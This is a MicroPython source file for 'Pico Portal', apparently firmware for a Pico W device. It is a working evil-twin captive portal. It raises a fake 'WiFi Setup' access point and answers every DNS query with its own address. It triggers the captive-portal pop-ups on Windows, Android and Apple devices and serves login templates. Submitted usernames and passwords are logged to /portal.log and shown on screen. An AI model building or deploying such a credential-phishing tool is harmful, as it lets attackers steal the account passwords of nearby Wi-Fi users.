# =============================================================================
#  Project: Pico Portal
#  License: CC-BY-NC-4.0
# =============================================================================

import gc
import os
import sys
import time
import uasyncio  # type: ignore

from ..crt import CELL
from ..storage import local_time


_TEMPLATE_DIR = "/templates/login"
_SUCCESS_TEMPLATE_DIR = "/templates/success"
_FALLBACK_PAGE = (
    b"<!doctype html><meta name=viewport content='width=device-width'>\n"
    b"<style>body{background:#001108;color:#34f58a;font:18px monospace;"
    b"margin:12vh 8%}</style>\n"
    b"<h1>Login</h1><p>Portal online.</p><small>Failed to load page.</small>"
)
_SUCCESS_PAGE = (
    b"<!doctype html><meta name=viewport content='width=device-width'>\n"
    b"<style>body{background:#001108;color:#34f58a;font:20px monospace;"
    b"margin:18vh 8%}</style>\n"
    b"<h1>SUBMITTED</h1>"
)


def _drop_module(name):
    sys.modules.pop(name, None)
    if "." in name:
        parent_name, child_name = name.rsplit(".", 1)
        parent = sys.modules.get(parent_name)
        if parent is not None and hasattr(parent, child_name):
            delattr(parent, child_name)


def _compact_startup_heap():
    """Release optional helpers before CYW43/server buffer allocation."""
    for name in (
        "pico-portal-os.apps.keyboard",
        "pico-portal-os.radio",
        "ntptime",
        "random",
        "urequests",
    ):
        _drop_module(name)
    gc.collect()


class PortalServer:
    async def run(self, ctx):
        await self._serve(ctx)

    async def _serve(self, ctx):
        crt = ctx.crt
        ssid = str(ctx.config["portal"].get("ssid", "WiFi Setup"))
        password = str(ctx.config["portal"].get("password", ""))
        template = self._resolve_template(
            ctx.config["portal"].get("template", ""), _TEMPLATE_DIR
        )
        success_template = self._resolve_template(
            ctx.config["portal"].get("success_template", "success.html"),
            _SUCCESS_TEMPLATE_DIR,
            default_name="success.html",
        )
        ctx.lamp.status("warning")
        self._status(crt, "STARTING AP", ssid)
        _compact_startup_heap()
        info = None
        for attempt in range(2):
            try:
                ctx.wifi.disconnect()
                gc.collect()
                info = ctx.wifi.start_ap(ssid, password)
                break
            except MemoryError:
                ctx.wifi.stop_ap()
                if attempt:
                    break
                _compact_startup_heap()
                await uasyncio.sleep_ms(0)
            except Exception as exc:  # noqa: BLE001
                await self._message(ctx, "AP FAILED", str(exc))
                return
        if info is None:
            await self._message(ctx, "AP FAILED", "memory allocation failed")
            return
        try:
            ip = info[0]
        except Exception as exc:  # noqa: BLE001
            ctx.wifi.stop_ap()
            await self._message(ctx, "AP FAILED", str(exc))
            return
        del info
        gc.collect()

        stats = {
            "hits": 0,
            "submissions": 0,
            "username": "",
            "password": "",
            "last_path": "",
        }
        try:
            handler = self._handler(ctx, stats, ip, template, success_template)
            server = None
            for attempt in range(2):
                gc.collect()
                try:
                    server = await uasyncio.start_server(handler, "0.0.0.0", 80)
                    break
                except MemoryError:
                    if attempt:
                        raise
                    _compact_startup_heap()
                    await uasyncio.sleep_ms(0)
            del handler
        except Exception as exc:  # noqa: BLE001
            ctx.wifi.stop_ap()
            await self._message(ctx, "WEB FAILED", str(exc))
            return

        dns_socket = self._dns_socket(ip)
        stats["dns"] = dns_socket is not None
        if dns_socket is not None:
            await ctx.lamp.feedback("success", restore=False)
        else:
            ctx.lamp.status("warning")
        dns_task = None
        if dns_socket is not None:
            dns_task = uasyncio.create_task(self._dns_loop(dns_socket, ip))

        started = time.ticks_ms()
        try:
            while True:
                _up, _down, _select, back = ctx.input.poll()
                if back:
                    return
                self._draw_live(
                    crt,
                    ssid,
                    password,
                    ip,
                    template,
                    success_template,
                    stats,
                    started,
                )
                await uasyncio.sleep_ms(80)
        finally:
            if dns_task is not None:
                dns_task.cancel()
            if dns_socket is not None:
                dns_socket.close()
            server.close()
            wait_closed = getattr(server, "wait_closed", None)
            if wait_closed is not None:
                try:
                    await wait_closed()
                except Exception:  # noqa: BLE001
                    pass
            await uasyncio.sleep_ms(0)
            ctx.wifi.stop_ap()
            _drop_module("socket")
            ctx.lamp.status("idle")
            gc.collect()

    def _handler(self, ctx, stats, ip, template, success_template):
        async def handle(reader, writer):
            try:
                request = await reader.readline()
                path = "/"
                parts = request.decode().split(" ")
                query = ""
                if len(parts) > 1:
                    target = parts[1]
                    if target.startswith("http://") or target.startswith(
                        "https://"
                    ):
                        slash = target.find("/", target.find("://") + 3)
                        target = target[slash:] if slash >= 0 else "/"
                    if "?" in target:
                        path, query = target.split("?", 1)
                    else:
                        path = target
                while True:
                    line = await reader.readline()
                    if not line or line == b"\r\n":
                        break
                stats["hits"] += 1
                stats["last_path"] = path[:32]
                status = "200 OK"
                headers = ""
                body = b""
                page_path = ""
                page_length = 0
                if path in ("/submit", "/login"):
                    fields = self._query_fields(query)
                    username = self._clean(fields.get("username", ""))
                    password = self._clean(fields.get("password", ""))
                    stats["submissions"] += 1
                    stats["username"] = username
                    stats["password"] = password
                    self._log(ctx, username, password)
                    page_path, page_length = self._page_source(
                        success_template,
                        _SUCCESS_TEMPLATE_DIR,
                    )
                    if not page_path:
                        body = _SUCCESS_PAGE
                elif path in ("/connecttest.txt", "/ncsi.txt"):
                    # An unexpected empty response tells the Windows
                    # connectivity
                    # assistant this network is captive.
                    body = b""
                elif path in (
                    "/",
                    "/hotspot-detect.html",
                    "/library/test/success.html",
                ):
                    page_path, page_length = self._page_source(
                        template, _TEMPLATE_DIR
                    )
                    if not page_path:
                        body = _FALLBACK_PAGE
                elif path == "/success":
                    page_path, page_length = self._page_source(
                        success_template,
                        _SUCCESS_TEMPLATE_DIR,
                    )
                    if not page_path:
                        body = _SUCCESS_PAGE
                elif path == "/generate_204":
                    # A non-204 response plus a portal location triggers
                    # Android's
                    # captive-network assistant.
                    status = "200 OK"
                    headers = "Location: http://{}/\r\n".format(ip)
                else:
                    status = "301 Moved Permanently"
                    headers = "Location: http://{}/\r\n".format(ip)
                payload = body if isinstance(body, bytes) else body.encode()
                content_length = page_length if page_path else len(payload)
                writer.write(
                    (
                        "HTTP/1.1 {}\r\n"
                        "Content-Type: text/html; charset=utf-8\r\n"
                        "Cache-Control: no-store\r\n"
                        "Captive-Portal: http://{}/\r\n"
                        "{}Content-Length: {}\r\n"
                        "Connection: close\r\n\r\n"
                    )
                    .format(
                        status,
                        ip,
                        headers,
                        content_length,
                    )
                    .encode()
                )
                drain = getattr(writer, "drain", None)
                if page_path:
                    # Stream templates to save heap.
                    with open(page_path, "rb") as page:
                        while True:
                            chunk = page.read(256)
                            if not chunk:
                                break
                            writer.write(chunk)
                            if drain is not None:
                                await drain()
                else:
                    writer.write(payload)
                    if drain is not None:
                        await drain()
            except Exception as exc:  # noqa: BLE001
                stats["last_error"] = str(exc)[:28]
            finally:
                writer.close()
                wait_closed = getattr(writer, "wait_closed", None)
                if wait_closed is not None:
                    try:
                        await wait_closed()
                    except Exception:  # noqa: BLE001
                        pass

        return handle

    def _query_fields(self, query):
        """Parse an application/x-www-form-urlencoded query string."""
        fields = {}
        if query.startswith("?"):
            query = query[1:]
        if "#" in query:
            query = query.split("#", 1)[0]
        for part in query.split("&"):
            if "=" in part:
                key, value = part.split("=", 1)
                key = self._url_decode(key).lower()
                if key:
                    fields[key] = self._url_decode(value)
        return fields

    def _clean(self, value):
        clean = []
        for char in value:
            if 32 <= ord(char) <= 126:
                clean.append(char)
        return "".join(clean)

    def _url_decode(self, value):
        """
        Decode one form component without relying on urllib or slice parsing.
        """
        output = bytearray()
        index = 0
        while index < len(value):
            char = value[index]
            if char == "+":
                output.append(32)
            elif char == "%" and index + 2 < len(value):
                high = self._hex_nibble(value[index + 1])
                low = self._hex_nibble(value[index + 2])
                if high >= 0 and low >= 0:
                    output.append((high << 4) | low)
                    index += 3
                    continue
                output.append(37)
            else:
                output.extend(char.encode())
            index += 1
        try:
            return bytes(output).decode()
        except Exception:  # noqa: BLE001
            return ""

    def _hex_nibble(self, char):
        code = ord(char)
        if 48 <= code <= 57:
            return code - 48
        if 65 <= code <= 70:
            return code - 55
        if 97 <= code <= 102:
            return code - 87
        return -1

    def _log(self, ctx, name, code):
        try:
            try:
                oversized = os.stat("/portal.log")[6] > 4096
            except OSError:
                oversized = False
            if oversized:
                with open("/portal.log", "w") as log:
                    log.write("-- log rotated --\n")
            with open("/portal.log", "a") as log:
                log.write(
                    "{} | {} | {}\n".format(self._timestamp(ctx), name, code)
                )
        except OSError:
            pass

    def _timestamp(self, ctx):
        now, _offset = local_time(ctx.clock_config)
        hour = now[3]
        suffix = "AM" if hour < 12 else "PM"
        hour = hour % 12 or 12
        return "{}/{}/{:02d} {}:{:02d} {}".format(
            now[1], now[2], now[0] % 100, hour, now[4], suffix
        )

    def _template_files(self, directory):
        """Return selectable HTML files currently present in a directory."""
        templates = []
        try:
            names = os.listdir(directory)
        except OSError:
            return templates
        for name in names:
            if not self._valid_template_name(name):
                continue
            try:
                mode = os.stat(directory + "/" + name)[0]
                if mode & 0x4000:
                    continue
            except OSError:
                continue
            templates.append(name)
        templates.sort()
        return templates

    def _valid_template_name(self, name):
        if not isinstance(name, str) or len(name) <= 4:
            return False
        lower_name = name.lower()
        if not (lower_name.endswith(".html") or lower_name.endswith(".htm")):
            return False
        return "/" not in name and "\\" not in name

    def _template_label(self, name):
        """Hide the HTML suffix without changing the stored filename."""
        return name[:-5] if name.lower().endswith(".html") else name[:-4]

    def _resolve_template(self, selected, directory, default_name=""):
        templates = self._template_files(directory)
        if selected in templates:
            return selected
        if default_name in templates:
            return default_name
        return templates[0] if templates else ""

    def _page_source(self, name, directory):
        """Return a verified template path and size without reading its body."""
        if not self._valid_template_name(name):
            return "", 0
        path = directory + "/" + name
        try:
            size = os.stat(path)[6]
            return path, size
        except OSError:
            return "", 0

    def _dns_socket(self, ip):
        try:
            import socket

            dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                dns_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except Exception:  # noqa: BLE001
                pass
            dns_socket.setblocking(False)
            try:
                address = socket.getaddrinfo(ip, 53, 0, socket.SOCK_DGRAM)[0][
                    -1
                ]
            except Exception:  # noqa: BLE001
                address = (ip, 53)
            dns_socket.bind(address)
            return dns_socket
        except Exception:  # noqa: BLE001
            return None

    async def _dns_loop(self, dns_socket, ip):
        while True:
            try:
                query, address = dns_socket.recvfrom(256)
                reply = self._dns_reply(query, ip)
                if reply:
                    dns_socket.sendto(reply, address)
            except OSError:
                pass
            await uasyncio.sleep_ms(20)

    def _dns_reply(self, query, ip):
        """Build the catch-all reply shape used by Pico Portal's Phew."""
        if len(query) < 17 or query[4:6] == b"\x00\x00":
            return None
        try:
            packed_ip = bytes(int(part) for part in ip.split("."))
        except (TypeError, ValueError):
            return None
        header = query[:2] + b"\x81\x80" + query[4:6] + query[4:6]
        header += b"\x00\x00\x00\x00"
        answer = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + packed_ip
        return header + query[12:] + answer

    def _draw_live(
        self,
        crt,
        ssid,
        password,
        ip,
        template,
        success_template,
        stats,
        started,
    ):
        crt.begin()
        content_top = crt.ui_title("PORTAL ONLINE")
        box_y = content_top + 4
        row_gap = CELL + (2 if crt.h <= 160 else 5)
        rows = (
            ("SSID", ssid),
            ("PASS", password or "OPEN"),
            ("IP", ip),
            ("PAGE", self._template_label(template) or "FALLBACK"),
            ("SUCCESS", self._template_label(success_template) or "FALLBACK"),
        )
        box_h = 10 + len(rows) * row_gap
        crt.box(8, box_y, crt.w - 16, box_h, "dim", title="ACCESS POINT")
        value_width = max(40, crt.w - 112)
        for index, row in enumerate(rows):
            y = box_y + 8 + index * row_gap
            crt.text(row[0], 16, y, 1, "dim")
            value = crt.clip_text(row[1], value_width, 1)
            crt.text_right(value, crt.w - 16, y, 1, "fg")

        info_y = box_y + box_h + 8
        if crt.h > 160:
            seconds = time.ticks_diff(time.ticks_ms(), started) // 1000
            crt.text_center(
                "HTTP {:04d}  FORM {:03d}  UP {:04d}s".format(
                    stats["hits"], stats["submissions"], seconds
                ),
                info_y,
                1,
                "mid",
            )
            crt.text_center(
                (
                    "DNS catch-all + captive probes active"
                    if stats.get("dns")
                    else "DNS PORT 53 FAILED - USE IP"
                ),
                info_y + row_gap,
                1,
                "dim" if stats.get("dns") else "alarm",
            )
            crt.text_center(
                "LAST {} / {}".format(
                    stats["username"] or "--", stats["password"] or "--"
                )[:36],
                info_y + 2 * row_gap,
                1,
                "fg",
            )
            crt.text_center(
                stats["last_path"] or "waiting for client",
                info_y + 3 * row_gap,
                1,
                "dim",
            )
            self._packet_graph(crt, stats["hits"])
        else:
            crt.text_center(
                "HTTP {}  FORM {}".format(stats["hits"], stats["submissions"]),
                info_y,
                1,
                "mid",
            )
            crt.text_center(
                "{} / {}".format(
                    stats["username"] or "--", stats["password"] or "--"
                )[:26],
                info_y + row_gap,
                1,
                "fg",
            )
        crt.button_hints(top_left="STOP")
        crt.end()

    def _packet_graph(self, crt, hits):
        left = 18
        y = crt.h - 48
        width = crt.w - 36
        crt.hline(y + 20, "dim", left, left + width)
        for i in range(18):
            height = 2 + ((hits * 7 + i * 11) % 18)
            crt.use("fg" if i > 14 else "mid")
            crt.g.rectangle(left + i * width // 18, y + 20 - height, 3, height)

    def _status(self, crt, title, detail):
        crt.begin()
        crt.text_center(title, crt.h // 2 - 15, 2, "hi")
        crt.text_center(detail[:28], crt.h // 2 + 12, 1, "mid")
        crt.end()

    async def _message(self, ctx, title, detail):
        ctx.lamp.status("error")
        try:
            while True:
                _up, _down, _select, back = ctx.input.poll()
                if back:
                    return
                crt = ctx.crt
                crt.begin()
                crt.text_center(title, crt.h // 2 - 15, 2, "hi")
                crt.text_center(str(detail)[:28], crt.h // 2 + 12, 1, "mid")
                crt.button_hints(top_left="BACK")
                crt.end()
                await uasyncio.sleep_ms(50)
        finally:
            ctx.lamp.status("idle")
